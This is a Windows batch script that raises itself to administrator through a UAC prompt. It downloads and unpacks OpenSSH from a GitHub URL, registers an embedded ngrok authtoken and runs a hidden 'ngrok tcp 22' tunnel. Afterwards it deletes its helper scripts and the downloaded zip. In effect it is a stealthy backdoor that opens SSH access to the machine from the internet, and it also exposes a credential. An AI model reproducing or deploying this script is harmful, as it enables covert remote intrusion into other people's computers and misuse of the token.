@echo off
:-------------------------------------
@echo off
REM  --> Analizando los permisos
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

@echo off
if '%errorlevel%' NEQ '0' (
@echo off
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  ::/Pro

mkdir C:\temp

cd C:\temp

echo Set objShell = WScript.CreateObject("WScript.Shell")>run.vbs

echo Set oFSO = CreateObject("Scripting.FileSystemObject")>>run.vbs

echo set objWShell = wScript.createObject("WScript.Shell")>>run.vbs

echo Set fso = CreateObject("Scripting.FileSystemObject")>>run.vbs

echo usrName = objWShell.expandEnvironmentStrings("%USERNAME%")>>run.vbs




echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")>>run.vbs

echo dim bStrm: Set bStrm = createobject("Adodb.Stream")>>run.vbs

echo xHttp.Open "GET", "https://raw.githubusercontent.com/ghostman2709/files/main/OpenSSH-Win64-w7.zip" , false>>run.vbs

echo xHttp.Send>>run.vbs


echo with bStrm>>run.vbs

echo  .type = 1 '//binary>>run.vbs

echo  .open>>run.vbs

echo  .write xHttp.responseBody>>run.vbs

echo  .savetofile "c:\temp\OpenSSH-Win64.zip", 2 '//overwrite>>run.vbs

echo end with>>run.vbs

echo 'The location of the zip file.>>run.vbs
echo ZipFile="C:\temp\OpenSSH-Win64.Zip">>run.vbs
echo 'The folder the contents should be extracted to.>>run.vbs
echo ExtractTo="C:\temp\">>run.vbs

echo 'If the extraction location does not exist create it.>>run.vbs
echo Set fso = CreateObject("Scripting.FileSystemObject")>>run.vbs
echo If NOT fso.FolderExists(ExtractTo) Then>>run.vbs
echo    fso.CreateFolder(ExtractTo)>>run.vbs
echo End If>>run.vbs

echo 'Extract the contants of the zip file.>>run.vbs
echo set objShell = CreateObject("Shell.Application")>>run.vbs
echo set FilesInZip=objShell.NameSpace(ZipFile).items>>run.vbs
echo objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)>>run.vbs
echo Set fso = Nothing>>run.vbs
echo Set objShell = Nothing>>run.vbs

echo Set objShell = WScript.CreateObject("WScript.Shell")>run2.vbs

echo Set oFSO = CreateObject("Scripting.FileSystemObject")>>run2.vbs

echo set objWShell = wScript.createObject("WScript.Shell")>>run2.vbs

echo Set fso = CreateObject("Scripting.FileSystemObject")>>run2.vbs

echo usrName = objWShell.expandEnvironmentStrings("%USERNAME%")>>run2.vbs

echo objShell.Run "ngrok config add-authtoken 7zFPzj3u8MAQjqyJsMKWx_5otRYcmDfdQfq1PRTcSTe", vbhide >>run2.vbs

echo objShell.Run "C:\temp\ngrok tcp 22", vbhide -force >>run2.vbs

timeout 2

cd C:\temp

start run.vbs

timeout 5

start down-init.vbs

timeout 5

start run2.vbs

timeout 5

del run2.vbs

del run.vbs

del OpenSSH-Win64.zip
